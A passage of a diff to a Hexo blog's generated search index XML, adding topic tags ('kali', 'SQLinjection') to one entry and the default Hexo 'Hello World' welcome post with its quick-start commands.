-            
-            <tag> hexo </tag>
-            
-        </tags>
-      
-    </entry>
-    
-  
-  
+      <tags>
+        <tag>kali</tag>
+        <tag>SQLinjection</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Hello World]]></title>
+    <url>%2F2018%2F07%2F23%2Fhello-world%2F</url>
+    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
+      <tags>
+        <tag>hexo</tag>
+      </tags>
+  </entry>
 </search>
